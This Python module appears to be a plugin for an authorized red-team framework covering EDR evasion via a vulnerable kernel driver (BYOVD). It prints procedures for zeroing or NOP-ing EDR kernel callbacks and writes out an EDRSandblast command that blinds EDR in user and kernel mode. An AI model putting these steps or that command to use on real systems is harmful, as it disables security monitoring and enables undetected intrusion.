"""EDR callback removal via vulnerable driver — blind EDR kernel callbacks."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.byovd.callback_kill.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kernel_callback_remove", "edr_disable"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1562.001", "T1068"],
}

CALLBACK_TYPES = [
    "PsSetCreateProcessNotifyRoutine",
    "PsSetCreateThreadNotifyRoutine",
    "PsSetLoadImageNotifyRoutine",
    "CmRegisterCallback",
    "ObRegisterCallbacks",
    "MiniFilter (FltRegisterFilter)",
]


def run(args: Any) -> int:
    driver = getattr(args, "driver", "RTCore64")
    action = getattr(args, "callback_action", "list")
    target_edr = getattr(args, "target_edr", None)

    if action == "list":
        print("[*] Kernel callback types that EDRs register:")
        for cb in CALLBACK_TYPES:
            print(f"  - {cb}")
        print("\n[*] Tools for callback enumeration:")
        print("  - EDRSandblast (enumerate + remove)")
        print("  - CheekyBlinder (RTCore64-based)")
        print("  - CallbackHell (multi-driver)")
        return 0

    if action == "enumerate":
        print(f"[*] Enumerating kernel callbacks via {driver} driver...")
        print("[*] This requires:")
        print("  1. Load vulnerable driver")
        print("  2. Read PspCreateProcessNotifyRoutine array")
        print("  3. Resolve callback addresses to driver names")
        if target_edr:
            print(f"[*] Filtering for: {target_edr}")
        return 0

    if action == "remove":
        print(f"[*] Removing EDR callbacks via {driver} driver:")
        print("  1. Enumerate callback array addresses")
        print("  2. For each EDR callback:")
        print("     a. Read callback struct from kernel memory")
        print("     b. Zero out the callback function pointer")
        print("     c. Or replace with a NOP stub")
        print("  3. EDR loses visibility into process/thread/image events")
        if target_edr:
            print(f"\n[*] Targeting: {target_edr} callbacks only")
        print("\n[!] EDRSandblast command:")
        print(f"  EDRSandblast.exe --usermode --kernelmode --driver {driver}")
        return 0

    return 1
